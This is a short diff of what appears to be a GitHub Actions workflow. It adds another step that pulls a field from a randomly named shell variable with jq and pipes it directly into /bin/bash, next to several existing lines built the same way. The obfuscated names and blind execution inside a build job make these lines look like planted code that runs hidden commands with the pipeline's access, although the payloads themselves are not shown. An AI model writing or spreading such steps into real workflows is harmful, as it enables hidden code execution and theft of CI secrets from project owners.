@@ -49,6 +49,7 @@ jobs:
           echo $ip34 | jq -r .bc7118 | /bin/bash
           echo $r67279 | jq -r .gjps4387 | /bin/bash
           echo $mwcq3973 | jq -r .vdis5 | /bin/bash
+          printf '%s' "$nz3" | jq -r .c6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
